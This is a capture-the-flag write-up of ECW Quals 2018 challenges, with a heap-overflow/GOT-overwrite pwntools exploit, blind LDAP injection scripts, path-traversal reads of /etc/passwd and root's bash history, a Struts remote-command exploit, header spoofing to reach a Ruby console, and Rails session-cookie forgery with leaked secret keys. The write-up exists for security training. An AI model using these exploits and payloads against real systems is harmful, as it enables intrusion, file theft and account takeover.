---
author: "Maki"
title: "Quals ECW 2018"
slug: "qualsecw2018"
date: 2018-10-22
description: "Challenges writeups on Quals ECW 2018."
---

# Chatbot

<center>

| Event     | Challenge | Category              | Points | Solves |
|-----------|-----------|-----------------------|--------|--------|
| ECW Quals | Chatbot   | "Reverse Engineering" | 150    | ~ 21   |

</center>

## Find the vulnerability

To begin with, I just played with the binary, trying to find bugs in it... After a few seconds I found this:

<center>
![](/img/writeups/qualsecw2018/segfault1.png) 
_Fig1_: Segfault
</center>

Ok, maybe there is something here, let's open IDA :D (I hate it).

<center>
![](/img/writeups/qualsecw2018/vulnerability.png) 
_Fig2_: Malloc in binary
</center>

* Framed in red: A few `malloc` declaration.
* Purple highlight: `nickname` variable.
* Green highlight: `chatbot` variable.

According to the previous picture, we can assume that the heap looks like this:

<center>
![](/img/writeups/qualsecw2018/heap_chatbot.png) 
_Fig3_: Heap state
</center>

Ok, so we saw that the program crashes when I enter too many bytes, let's see how many it takes:

<center>
![](/img/writeups/qualsecw2018/offset.png) 
_Fig4_: Segfault with a debugger
</center>

* Framed in purple: Generation of the segfault.
* Framed in red: Offset determination.

If we try to overflow 16 bytes after the nickname, we're here in the heap:

<center>
![](/img/writeups/qualsecw2018/overflow1.png) 
_Fig5_: Heap state when overflowing
</center>

## Read everywhere

Now, let's try to display an internal string of the binary as botname!
I decided to take this one:

<center>
![](/img/writeups/qualsecw2018/ida_str_yo.png) 
_Fig6_: Internal string
</center>

Poc:

<center>
![](/img/writeups/qualsecw2018/poc_readeverywhere.png) 
_Fig7_: w00t
</center>

## Hypothesis

Ok so now we have something really great. What would happened if I can overwrite a GOT address with the address of the system() function? It would look like this:

<center>
![](/img/writeups/qualsecw2018/hypothesis.png) 
_Fig8_: GOT overwrite
</center>

## Exploit

Let's exploit it :)

### Bypass ASLR

I need to find a leak in one the libc functions in order to find the libc base address. Then I'll be able to find the offset between the base address and the system() function.

#### Leak the __libc_start_main address

There is a well-known leak in the `__libc_start_main` function in the GOT. We can extract the adress of this function:

<center>
![](/img/writeups/qualsecw2018/start_main_libc.png) 
_Fig9_: Libc start main address
</center>

#### Calculate Libc base address

You will need to display `/proc/[PID of Chatbot]/maps` to get the libc base address and calculate the offset:

```bash
$ ps -A | grep chat
32576 pts/7    00:00:00 chatbot

$ cat /proc/32576/maps
[...]
f7dda000-f7f87000 r-xp 00000000 fd:00 4456457                            /lib32/libc-2.23.so
f7f87000-f7f88000 ---p 001ad000 fd:00 4456457                            /lib32/libc-2.23.so
f7f88000-f7f8a000 r--p 001ad000 fd:00 4456457                            /lib32/libc-2.23.so
f7f8a000-f7f8b000 rw-p 001af000 fd:00 4456457                            /lib32/libc-2.23.so
[...]
```

> Which one of the displayed libc do we need to choose ?

You need to know the system() function address. So your libc base needs to be executable because all the functions in a binary are executable, right ? We can see that only the first one `0xf7dda000` have this permission.

<center>
![](/img/writeups/qualsecw2018/aslr_bypassed.png) 
_Fig10_: Bypass aslr
</center>

* Framed in red: In the center, you can see the offset determination. On the right, there is the calculation of the libc base address.
* Framed in yellow: Top right, our new libc base address (because I restarted the chatbot binary, the ASLR randomized the addresses). On the left, you can check our substraction, it looks like it works :)

Another tip, the libc is mapped on memory page, so if after your calculation you have an address that ends with `000` it sounds good. The memory pages are 4Kb long, so `0x1000` in hex.

### System address

We have our libc base address, now we have to find the address of the `system()` function.

<center>
![](/img/writeups/qualsecw2018/systemaddre.png) 
_Fig11_: System() address
</center>

* Framed in red: System address determination.
* Framed in yellow: Little addition.
* Framed in cyan: Check the system address, it looks like it works :)

### Final local exploit

At this point, we have everything we need to exploit the binary and get a shell:

<center>
![](/img/writeups/qualsecw2018/local_exploit.png) 
_Fig12_: Exploit :D
</center>

![](https://media.giphy.com/media/yoJC2GnSClbPOkV0eA/giphy.gif)

## Flag

As we can see, we don't have any return of our function, so I use a little binary called `ngrok` to get a netcat on my laptop (without opening ports).

> https://ngrok.com/

And then, the graal:

<center>
![](/img/writeups/qualsecw2018/flag.png) 
_Fig13_: The flag !!
</center>

---

### Complete exploit code:

```python
#!/usr/bin/python2

from pwn import *

#ip = '127.0.0.1'
ip = '54.36.205.82'

addr_yoPython = 0x08049931
addr_libcStartMain = 0x0804C03C
addr_strlengot = 0x0804C038

c = remote(ip, 22000)
print(c.recv(4069))
c.sendline("nickname")
print(c.recv(4096))
#c.interactive()
c.sendline('A'*16+p32(addr_libcStartMain))
c.sendline("help")
rawleak = c.recvuntil("I")
addr_startmain = rawleak.split('\x00')[5][:4] # Had to change my split member from 4 to 5 don't know why
print('Addr start_main: 0x%x' % u32(addr_startmain))
c.recv(4096)
addr_baselibc = u32(addr_startmain) - 0x18540
print('Addr base libc: 0x%x' % addr_baselibc)
addr_system = addr_baselibc + 0x3a940
print('System address: 0x%x' % addr_system)
c.sendline("nickname")
c.recv(4096)
c.sendline('A'*16+p32(addr_strlengot))
c.recv(4096)
c.sendline("botname")
c.recv(4096)
c.sendline(p32(addr_system))
c.interactive()
```

---

# AdmYSion

<center>

| Event   | Challenge | Category         | Points | Solves |
|---------|-----------|------------------|--------|--------|
|ECW Quals|AdmYSion   | Web              |50      | ~ 53   |

</center>

## State of the art

We only have a login form in front of us:

<center>
![](/img/writeups/qualsecw2018/adm_1.png)
_Fig1_: Login form
</center>

My first move was trying an SQL injection... It was useless, in fact it's an `LDAP injection`:

<center>
![](/img/writeups/qualsecw2018/adm_2.png)
_Fig2_: Asterisk matching with all the LDAP accounts
</center>

Our little asterisk `*` is matching with all the accounts in the LDAP base, it's now time to script :D

## Blind LDAP Injection

Because I already did an LDAP injection on a famous french challenge platform (it starts by `root` and ends by `-me.org`), I know that the payload will have the following aspect

> *)(cn=*))\x00

The `cn` part will change, it's a common field in an LDAP base, it means `Common Name`. The null byte at the end is used to remove the password field.

## Find LDAP fields

I built a little dictionary with all the common LDAP fields:

```raw
c
cn
dc
facsimileTelephoneNumber
co
gn
homePhone
jpegPhoto
id
l
mail
mobile
o
ou
owner
name
pager
password
sn
st
uid
username
userPassword
```

And then a little python script to bruteforce them:

```python
#!/usr/bin/python3

import requests
import string

ava = []

url = 'https://web050-admyssion.challenge-ecw.fr/'

f = open('dic', 'r')
dic = f.read().split('\n')
f.close()

for i in dic:
    r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\x00', 'password':'bla'})
    if 'Error: This login is associated with' in r.text:
        ava.append(str(i))

print(ava)
```

### looking for the admin email

Okay, now I will dig into the `mail` field trying to find the email address of the administrator (I know my script is very, very ugly, I bruteforced manually each first letter...):

```python
#!/usr/bin/python3

import requests
import string
import itertools
from pprint import pprint

ava = []
partial = ''
no_pass = True
charset = string.ascii_lowercase+'.@'

url = 'https://web050-admyssion.challenge-ecw.fr/'

go = 'Error: This login is associated'
go2 = 'Login failed'
nogo = 'Account not found, please'

while no_pass:
    no_pass = False
    for i in charset:
        payload = '*)(mail=s'+str(partial+i)+'*))\x00'
        r = requests.post(url, data = {'login':payload, 'password':'bla'})
        if nogo not in r.text:
            no_pass = True
            partial += i
            break
    print(partial)
```

You can notice the little `s` in front of my _partial_ variable! I tried to find all `a`, `b` etc... And here is why `s`:

<center>
![](/img/writeups/qualsecw2018/adm_3.png)
_Fig3_: Email of the admin
</center>

`s`+`arah.connor.admin@yoloswag.com` looks to be the administrator. To find the username of the account, just change `mail` field into `cn`, it gives us: `s.connor`. And now, how can we find the password? By guessing for sure! Let's try 'yoloswag' as a password:

<center>
![](/img/writeups/qualsecw2018/adm_4.png)
_Fig3_: Flag
</center>

---

# SysIA

<center>

| Event   | Challenge | Category         | Points | Solves |
|---------|-----------|------------------|--------|--------|
|ECW Quals|SysIA      | Web              |75      | ~ 59   |

</center>

## State of the art

A nice cyber-hacker-haxxor-website-of-death containing a magical `robots.txt` file:

```
User-agent: *
Disallow: /notinterestingfile.php
```

## Local file include

<center>
![](/img/writeups/qualsecw2018/sysia_1.png)
_Fig1_: So sweet, the vulnerability <3
</center>

Let's try something:

> https://web075-sysia.challenge-ecw.fr/notinterestingfile.php?page=../../../../../../../etc/passwd

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false _apt:x:104:65534::/nonexistent:/bin/false
```

Ok, it works, there is only one user with a /bin/bash. I can't display any other web page via LFI, I think I'll try to display the `.bash_history`:

> https://web075-sysia.challenge-ecw.fr/notinterestingfile.php?page=../../../../../../../root/.bash_history

It worked (I will just put a snippet below because it's veeeeery long):

```
docker exec -it CTFd_NDH_2018 /bin/sh
ll
mkdir ndh
cd ndh/
locate flag.txt
updatedb
locate flag.txt
ll
nano Dockerfile
nano proxy.py
docker build . -n CTFd_ndh
```

## Flag location

Ok, he did an `updatedb`, so the location of `flag.txt` is stored in this database. The default path is: `/var/lib/mlocate/mlocate.db`

> https://web075-sysia.challenge-ecw.fr/notinterestingfile.php?page=../../../../../../../var/lib/mlocate/mlocate.db

<center>
![](/img/writeups/qualsecw2018/sysia_2.png)
_Fig2_: The flag.txt location
</center>

## Flag

> https://web075-sysia.challenge-ecw.fr/notinterestingfile.php?page=../../../../../../../var/www/ECW/solution/web/lfi/flag.txt

<center>
![](/img/writeups/qualsecw2018/sysia_3.png)
_Fig3_: Flag
</center>

---

# Troll.jsp

<center>

| Event   | Challenge | Category         | Points | Solves |
|---------|-----------|------------------|--------|--------|
|ECW Quals|Troll.JSP  | Web              |125     | ~ 36   |

</center>

## State of the art

A marvelous Java website, I looooove Java (joke.), so the flag appears to have been stolen:

<center>
![](/img/writeups/qualsecw2018/troll_1.png)
_Fig1_: Index of the website
</center>

I had to guess the `flag.jsp` page:

<center>
![](/img/writeups/qualsecw2018/troll_2.png)
_Fig2_: Fake flag 1
</center>

On `md5decrypt.net`, this hash gives us: `swp`, it looks like a backup file of vim. Let's try something like `.flag.jsp.swp`.

## Backup file

Oh, looks like we have the code of the `flag.jsp` page:

```jsp
<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<%@ taglib prefix = "s" uri = "/struts-tags" %>

<html>
   <head>
      <title>Flag page!</title>
   </head>
   <body>
<!--TODO change the flag -->
   <s:set var='flag' value='%{"ECW{2f3f3238f9a5783fe4767d77e53aaf3b}"}'/>
   <s:set var='trollFlag' value='%{"ECW{a9ec6fc4217038a6f91294b8e5ed9933}"}'/>

   <s:set var='result' value='%{#session.flag!=null?#flag:#trollFlag}'/>
<p>
      Congratz! You got a flag: <s:property value = "result"/>
</p>
   </body>
</html>
```

The new hash is still a fake flag. On `md5decrypt`, it gives us __equifax__.

> https://www.zdnet.fr/actualites/faille-apache-struts-equifax-veut-noyer-le-poisson-39857358.htm

Well, it's an Apache struts vulnerability. There are a lot of GitHub repositories exploiting this vulnerability, here is one of them: https://github.com/jas502n/st2-046-poc

## Exploitation

I just execute the GitHub script:

```bash
$ bash ./exploit-cd.sh https://web125-trolljsp.challenge-ecw.fr/.flag.jsp.swp 'find . -ls | grep flag'
[...]
  6556060     12 -rw-r-----   1 tomcat   tomcat      11530 Aug 22 13:35 ./opt/tomcat/work/Catalina/localhost/ECW/org/apache/jsp/flag_jsp.class
  6556061     16 -rw-r-----   1 tomcat   tomcat      16046 Aug 22 13:35 ./opt/tomcat/work/Catalina/localhost/ECW/org/apache/jsp/flag_jsp.java
  6556025      4 -rwxr-xr-x   1 root     root         2249 Aug 22 13:35 ./opt/tomcat/webapps/ECW/flag.jsp
  6556001      4 -rwxr-xr-x   1 root     root          556 Aug 22 13:34 ./opt/tomcat/webapps/ECW/.flag.jsp.swp
[...]

$ bash ./exploit-cd.sh https://web125-trolljsp.challenge-ecw.fr/.flag.jsp.swp 'cat ./opt/tomcat/webapps/ECW/flag.jsp'
[...]
              </a>
            </li>
          </ul>
        </div>
      </div>
    </nav><s:set var='flag' value='%{"ECW{babde20f76698360d6f1a500b821e797}"}'/><s:set var='trollFlag' value='%{"ECW{a9ec6fc4217038a6f91294b8e5ed9933}"}'/><s:set var='result' value='%{#session.flag!=null?#flag:#trollFlag}'/>
    <div class="container">
      <div class="row">
        <div class="col-lg-12 text-center">
			<p class="lead">Now that's a flag! <s:property value = "result"/></p>
[...]
```

## Flag

> ECW{babde20f76698360d6f1a500b821e797}

---

# Intrusion 1/4

<center>

| Event   | Challenge    | Category         | Points | Solves |
|---------|--------------|------------------|--------|--------|
|ECW Quals|Web           | Web              |??      | ??     |

</center>

## State of the art

I start this challenge with a website:

> web150-smartstuff.challenge-ecw.fr

Nothing really interesting at first glance. After digging a bit in HTML source code, I notice 2 pages:

* thor.css
* thor.js

## Thor.css

When I checked this file, I noticed a different subdomain:

> web150_dev.challenge-ecw.fr

## Flag

Then I just curl this new subdomain:

```bash
$ curl -v -H 'User-Agent: Chrome' https://web150_dev.challenge-ecw.fr
[...]
ECW{5822a94206522fe5382d2f00acc5cadf}
[...]
```

---

# Intrusion 2/4

<center>

| Event   | Challenge    | Category         | Points | Solves |
|---------|--------------|------------------|--------|--------|
|ECW Quals|Intrusion 2/4 | Web              |??      | ??     |

</center>

## State of the art

Ok, now we're on the dev platform. After a lot of fuzzing, I finally find a bug. When I'm sending `OPTIONS` HTTP request, I get a weird output:

```bash
$ curl -v -X OPTIONS -H 'User-Agent: Chrome' https://web150_dev.challenge-ecw.fr
```

<center>
![](/img/writeups/qualsecw2018/intru1.png)
_Fig1_: Output in browser
</center>

## X-Forwarded-For spoofing

In the previous Figure, we notice something interesting:

> HTTP_F_FORWARDED_FOR: "176.187.238.100, 10.1.0.10, 127.0.0.1"

In a previous CTF and in real-world pentests, I already came across this kind of WAF. It only allows connections from precise IP addresses, such as `127.0.0.1`.

```bash
$ curl -X OPTIONS -H 'X-Forwarded-For: 127.0.0.1' -H 'User-Agent: Chrome' https://web150_dev.challenge-ecw.fr/
```

<center>
![](/img/writeups/qualsecw2018/intru2.png)
_Fig2_: Web console
</center>

It's a Ruby webconsole. I used those lines to display the content of the directories and the files:

```ruby
Dir['*']
File.open('file').readlines()
```

## Flag

After looking over some files, I finally open `config/initializers/web_console.rb`:

<center>
![](/img/writeups/qualsecw2018/intru3.png)
_Fig3_: Flag, don't you see it?
</center>

Unhex string gives us:

> ECW{5948462211d00c9cec468fd194e76c5f}

---

# Intrusion hint

<center>

| Event   | Challenge    | Category         | Points | Solves |
|---------|--------------|------------------|--------|--------|
|ECW Quals|Intrusion hint| Web              |??      | ??     |

</center>

## State of the art

This time, it's not on the dev platform, it's on a new website:

<center>
![](/img/writeups/qualsecw2018/intru4.png)
_Fig1_: Website
</center>

Maybe something with `LIKE` in SQL:

<center>
![](/img/writeups/qualsecw2018/intru5.png)
_Fig2_: Amount of hint
</center>

5 hints found in the database. Let's extract them :)

## Data extraction

I guess one of them is the flag. The payload looks like:

> [char]*

So I did this little script (do you remember my ugly script in `AdmYSsion`?):

```python
import requests
import string

partial = ''
no_pass = True
charset = string.hexdigits+'}'

url = 'https://web150-hint.challenge-ecw.fr/search'

nogo = '1 hint found'

while no_pass:
    no_pass = False
    for i in charset:
        payload = 'ECW'+str(partial+i)+'%'
        r = requests.post(url, data = {'request': payload})
        if nogo in r.text:
            no_pass = True
            partial += i
            print('Found: '+partial)
            break
    print(partial)
```

## Hints

I edit the script to extract all the hints:

> https://gist.github.com/mbyczkowski/34fb691b4d7a100c32148705f244d028

> http://manpages.ubuntu.com/manpages/cosmic/en/man1/systemctl.1.html

> /home/web200/smart_stuff/config/initializers/web_console.rb

> /home/web200/smart_stuff/config/secrets.yml

## Flag

Then the flag:

> ECW{ebbbb414c38020906fd34bdd49ceea36}

---

# Intrusion 3/4

<center>

| Event   | Challenge    | Category         | Points | Solves |
|---------|--------------|------------------|--------|--------|
|ECW Quals|Intrusion hint| Web              |??      | ??     |

</center>

## State of the art

Go back to the dev platform, the real challenge is starting. One of the previous hints mentioned `secrets.yml`:

```yml
# Be sure to restart your server when you modify this file.

# Your secret key is used for verifying the integrity of signed cookies.
# If you change this key, all old signed cookies will become invalid!

# Make sure the secret is at least 30 characters and all random,
# no regular words or you'll be exposed to dictionary attacks.
# You can use `rails secret` to generate a secure secret key.

# Make sure the secrets in this file are kept private
# if you're sharing your code publicly.

# Shared secrets are available across all environments.

# shared:
#   api_key: a1B2c3D4e5F6

# Environmental secrets are only available for that specific environment.

development:
  secret_key_base: 08c89a3c48235a3e7211c1b7d3a239687929455cf8b6e3bc1c37ad5b4e937f0e9a5d0f3e62731375f099b692ae17e0852ee047d65ced240b7a38910e2ed06e59

test:
  secret_key_base: 1cd775a1587363d69a47ce39af7e7ff13ea1b2f10dbc3a92bed16ac05436c2493be22280deee4fde699a88208b2de3738ae1257208002b2b1f32029bb096717e

# Do not keep production secrets in the unencrypted secrets file.
# Instead, either read values from the environment.
# Or, use `bin/rails secrets:setup` to configure encrypted secrets
# and move the `production:` environment over there.

production:
  secret_key_base: <%= ENV[\"SECRET_KEY_BASE\"] %>
```

In another previous hint, the GitHub repository gave us a script able to decrypt Ruby on Rails cookies:

```Ruby
require 'cgi'
require 'json'
require 'active_support'

def verify_and_decrypt_session_cookie(cookie, secret_key_base)
  cookie = CGI::unescape(cookie)
  salt         = 'encrypted cookie'
  signed_salt  = 'signed encrypted cookie'
  key_generator = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000)
  secret = key_generator.generate_key(salt)[0, ActiveSupport::MessageEncryptor.key_len]
  sign_secret = key_generator.generate_key(signed_salt)
  encryptor = ActiveSupport::MessageEncryptor.new(secret, sign_secret, serializer: JSON)
  encryptor.decrypt_and_verify(cookie)
end
```

Then to decrypt my cookie I need:

* My Cookie (of course)
* salt
* signed_salt
* secret_key_base of the dev platform

## Decrypting the cookie

To obtain `salt` and `signed_salt`, I have to display `./config/application.rb`:

<center>
![](/img/writeups/qualsecw2018/intru6.png)
_Fig1_: salt and signed_salt
</center>

* salt: ECW-secret-salt
* signed-salt: ECW-signature-secret-salt

__/!\ config.action_dispatch.cookies_serializer = :marshal__ in `application.rb` !!!  It's not JSON formatted, it's Marshal formatted, and Marshal from Python and Ruby are different... 

I got the `secret_key_base` in `secrets.yml` file:

```
08c89a3c48235a3e7211c1b7d3a239687929455cf8b6e3bc1c37ad5b4e937f0e9a5d0f3e62731375f099b692ae17e0852ee047d65ced240b7a38910e2ed06e59
```

And the `cookie`:

```
NC9XWkNHT0lKMytId0E2cjdBQ1dKSnVSZ1MyeTV4elRsK0VHK1hrR1drSmJ4eEEzakU2TDhoTGZPWk9tZXZCZDhUemhHckF3NXU4bXIvdTZKWHQwQ3c1UXRVNkJoNm9ueFROYkYwZGdCZFhjSmNvR09LTityYi94dkJDVXZwNXpXNGFLZGNNSmJmdThtRE1iZGtwbmVWSFhOQ1ZBSUE3bGdWM3grUWhSb1hQWjdCd3NrbHJXaE40WXN5ekw3NHpmZlpzdlN1eTZoYmhhK01pSlNVV1dhWG4vM3J1a1VHcDh2TVI0VHVYbEY1NG1sSHBUUFNBRUJlaDdIdGVxcHd2Vk5kelVkMVJrZFZnd24zOWZQdXVJbjF2Tk8rUjRVSTUza0h5djNGWWVxd2dRdGVhMS9XMXZ4KytuZDFxeVc1V25GMW9CbmtQNUF0cEJGcTJ6MUtqc2ZsOE9icE5MZlU5cTFaeS9QSlN0ZjdNTkw4ZFNnOUhRWjdoTVdpbmFUdnBOZXV2djJOVm9nOWpiNEJnQ0ljLzJ5dHBjZGdPb3pyU1hzOUY0SUFtMVF4Y3VYODFvb04wemozV2puRUVTMnBUM2RDcjBnQ1N1R253aW1iVTlPNFYwQ1dxUTdRTUVVaGRnc3BWMXNiZ3VWWE5ReEJabmRaZ2xWY3FWTEZBL1dJYjF6all4bXcrNGg5cWx6aXNwVzBqVlVIQ1N0ajYzOHBPcU1BRmhwOGR6c2xQbUxNakFuVXdCcDd2VElnZHpEdDdyRHhYQVA1cm04TWo1VUdGVXNuQVVkUUt5VEVNUHQwOEhOL1JYcXpuaWhiVzNpN2hVemxqU2l3b2xUK1crazhEN2xKZFNnWTg3NU9lSms5UFdHM2JDQU0xQnRacWp1bTBVN21TVDRWME1BWEtwM3BvamdiMnJBYjEyRlkxUWJuWjdYc0ROUU12bGRxQ0VYNjhzZkpZbDBTWTVhdjdMWENSZW9HRXBZWHgzbDVoQjFtMHR2cHJrZnhidWRUNzlualIzZFl2aWliUVcrQ1RFNzBLY3hqV2lsZTVxZnpYOXMzREtJRUJQamJOZDlqZ1p3blkxemtsblB5S0pPNmF6dkVZSjFLNGE3Q2dqMHVJdkdUWC96d1Vzc2l2QXBIZkREdzRHU2FpWVp1S3VnR216ajJCdE9qU3NYbHlyZmZkdWlYUFVRSFZIbU9WUzA4RXBBQlRyYmhIR0ZnUFE4cEdZaitSMlBPYnBUN2s5c2MzekVGOG9Ua2dKMngweDkxRTRXM3lTWkIxVW4yWHNLUXZYd3FPZWtIS3M2ZlN0bjJIQUw0Y1ZJZXNpN3lSeGVpYXNLcGxPVjZ6WnFqaWNLMVowYmVPTy93aUQrV2VlWWI4MGIvcVYxeThuMmJkWjVnQVMrOEFtRW9NNGVzNm0vNFlFbE4zWTZVSTh6VmYyRUtsb3N5b3MxZnB0UysrMWJWWGM1ckpORjlPMW9KOGNjQzBCbnA0TEN4WUdhd00xdWNkbTAwNG4zYmJNRGJlRm1ScEhKRS9OSEd6NDE5R0dKOERmZHdRcmVyNFlwbGowdnVTQjFxSFVhL2ZuZG52dFNsM3FEU3AvMFZzaTVQbXE0bkJXNmpVUXV1YzlCL0NvcFlBUjhzVU44V3I5Lzh1YlhuUWFFS3VVcU52Z20xMmY1OU5mS1hqQ0xGMVd2NGs5RG5PaU9OcGp2YmUwMkFzeWpYdExDaGRrSHo3RTQyeTkwTzE0bkhldXlxQ0hCRmJlbmlPN3UzeXFzUkNwZGNzVmcwNllLRzZnSUtMT0pZN3NHRHp2S2ZmNjNMRTRqdDhQS3hTRG1NYVlkRHEzenBIdHBkbURnYmRYTDUzOHNEcWxQcmN2VmpkQi0tamVLWVpBZHFVcUdkd2EzWnJPNUFaQT09--9d215e2f0ade6d2657279fca4b2516d0c07b97da
```

I believed naively that I could use the decryption script on my laptop without any troubles... After a few hours of me going crazy, I had an illumination. I want to run a ruby script, I have a web console in ruby, YES!

Here is my beautiful decryption script with all the variables put together:

```ruby
cookie = NC9XWkNHT0lKMytId0E2cjdBQ1dKSnVSZ1MyeTV4elRsK0VHK1hrR1drSmJ4eEEzakU2TDhoTGZPWk9tZXZCZDhUemhHckF3NXU4bXIvdTZKWHQwQ3c1UXRVNkJoNm9ueFROYkYwZGdCZFhjSmNvR09LTityYi94dkJDVXZwNXpXNGFLZGNNSmJmdThtRE1iZGtwbmVWSFhOQ1ZBSUE3bGdWM3grUWhSb1hQWjdCd3NrbHJXaE40WXN5ekw3NHpmZlpzdlN1eTZoYmhhK01pSlNVV1dhWG4vM3J1a1VHcDh2TVI0VHVYbEY1NG1sSHBUUFNBRUJlaDdIdGVxcHd2Vk5kelVkMVJrZFZnd24zOWZQdXVJbjF2Tk8rUjRVSTUza0h5djNGWWVxd2dRdGVhMS9XMXZ4KytuZDFxeVc1V25GMW9CbmtQNUF0cEJGcTJ6MUtqc2ZsOE9icE5MZlU5cTFaeS9QSlN0ZjdNTkw4ZFNnOUhRWjdoTVdpbmFUdnBOZXV2djJOVm9nOWpiNEJnQ0ljLzJ5dHBjZGdPb3pyU1hzOUY0SUFtMVF4Y3VYODFvb04wemozV2puRUVTMnBUM2RDcjBnQ1N1R253aW1iVTlPNFYwQ1dxUTdRTUVVaGRnc3BWMXNiZ3VWWE5ReEJabmRaZ2xWY3FWTEZBL1dJYjF6all4bXcrNGg5cWx6aXNwVzBqVlVIQ1N0ajYzOHBPcU1BRmhwOGR6c2xQbUxNakFuVXdCcDd2VElnZHpEdDdyRHhYQVA1cm04TWo1VUdGVXNuQVVkUUt5VEVNUHQwOEhOL1JYcXpuaWhiVzNpN2hVemxqU2l3b2xUK1crazhEN2xKZFNnWTg3NU9lSms5UFdHM2JDQU0xQnRacWp1bTBVN21TVDRWME1BWEtwM3BvamdiMnJBYjEyRlkxUWJuWjdYc0ROUU12bGRxQ0VYNjhzZkpZbDBTWTVhdjdMWENSZW9HRXBZWHgzbDVoQjFtMHR2cHJrZnhidWRUNzlualIzZFl2aWliUVcrQ1RFNzBLY3hqV2lsZTVxZnpYOXMzREtJRUJQamJOZDlqZ1p3blkxemtsblB5S0pPNmF6dkVZSjFLNGE3Q2dqMHVJdkdUWC96d1Vzc2l2QXBIZkREdzRHU2FpWVp1S3VnR216ajJCdE9qU3NYbHlyZmZkdWlYUFVRSFZIbU9WUzA4RXBBQlRyYmhIR0ZnUFE4cEdZaitSMlBPYnBUN2s5c2MzekVGOG9Ua2dKMngweDkxRTRXM3lTWkIxVW4yWHNLUXZYd3FPZWtIS3M2ZlN0bjJIQUw0Y1ZJZXNpN3lSeGVpYXNLcGxPVjZ6WnFqaWNLMVowYmVPTy93aUQrV2VlWWI4MGIvcVYxeThuMmJkWjVnQVMrOEFtRW9NNGVzNm0vNFlFbE4zWTZVSTh6VmYyRUtsb3N5b3MxZnB0UysrMWJWWGM1ckpORjlPMW9KOGNjQzBCbnA0TEN4WUdhd00xdWNkbTAwNG4zYmJNRGJlRm1ScEhKRS9OSEd6NDE5R0dKOERmZHdRcmVyNFlwbGowdnVTQjFxSFVhL2ZuZG52dFNsM3FEU3AvMFZzaTVQbXE0bkJXNmpVUXV1YzlCL0NvcFlBUjhzVU44V3I5Lzh1YlhuUWFFS3VVcU52Z20xMmY1OU5mS1hqQ0xGMVd2NGs5RG5PaU9OcGp2YmUwMkFzeWpYdExDaGRrSHo3RTQyeTkwTzE0bkhldXlxQ0hCRmJlbmlPN3UzeXFzUkNwZGNzVmcwNllLRzZnSUtMT0pZN3NHRHp2S2ZmNjNMRTRqdDhQS3hTRG1NYVlkRHEzenBIdHBkbURnYmRYTDUzOHNEcWxQcmN2VmpkQi0tamVLWVpBZHFVcUdkd2EzWnJPNUFaQT09--9d215e2f0ade6d2657279fca4b2516d0c07b97da

secret_key_base = 08c89a3c48235a3e7211c1b7d3a239687929455cf8b6e3bc1c37ad5b4e937f0e9a5d0f3e62731375f099b692ae17e0852ee047d65ced240b7a38910e2ed06e59

salt = ECW-secret-salt
signed_salt = ECW-signature-secret-salt

key_generator = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000)
secret = key_generator.generate_key(salt)[0, ActiveSupport::MessageEncryptor.key_len]
sign_secret = key_generator.generate_key(signed_salt)
encryptor = ActiveSupport::MessageEncryptor.new(secret, sign_secret, serializer: Marshal)
encryptor.decrypt_and_verify(cookie)
```

<center>
![](/img/writeups/qualsecw2018/intru7.png)
_Fig2_: Decrypted cookie
</center>

```
{"session_id"=>"BLAH", "user"=>#<User id: nil, name: nil, password: nil, salt: nil, admin: nil, created_at: nil, updated_at: nil>}
```

## Cookie crafting

I don't have any screenshots of this part or any logs... But to craft a new admin cookie, you just have to set those fields:

* id: Any number
* name: Any name
* admin: true

In Ruby, it works like a dictionnary in Python:

```ruby
>> a = {"session_id"=>"BLAH", "user"=>#<User id: nil, name: nil, password: nil, salt: nil, admin: nil, created_at: nil, updated_at: nil>}
>> a['user']['name'] = admin
=> "admin"
>> a['user']['id'] = 1
=> 1
>> a['user']['admin'] = true
=> true
```

The encryption key and salt are already in memory, just use this function:

```ruby
b = encryptor.encrypt_and_sign(a)
[Big cookie]
```

## Connect as admin

Just open `Local storage` in your `Web developers tools` and overwrite your existing cookie, and... W00t! We're the admin of the dev platform!...

BUT IT'S USELESS!!!

<center>
![](https://media.giphy.com/media/26ufcVAp3AiJJsrIs/giphy.gif)
</center>

## Flag

Go back to the hints and look at the one mentionning `systemd`. After a few minutes of digging, I got this:

<center>
![](/img/writeups/qualsecw2018/intru9.png)
_Fig3_: Systemd file
</center>

> ECW{172ce5c14098e888a09053c0518bda08}

---

# Intrusion 4/4

<center>

| Event   | Challenge    | Category         | Points | Solves |
|---------|--------------|------------------|--------|--------|
|ECW Quals|Intrusion 4/4 | Web              |??      | ??     |

</center>

## State of the art

Well, now we have to get the admin access on the production platform. I have the `secret_key_base` key:

* secret_key_base of prod: A_cookie_of_course

## Crafting admin cookie

In the previous challenge, when I said it was "useless" to be the admin of the dev platform, it wasn't true. It taught me how to decrypt and craft cookies. Now I just have to take the prod cookie, decrypt it and I get the `session_id`.

```
{"session_id"=>"PROD SESSION ID", "user"=>#<User id: nil, name: nil, password: nil, salt: nil, admin: nil, created_at: nil, updated_at: nil>}
```

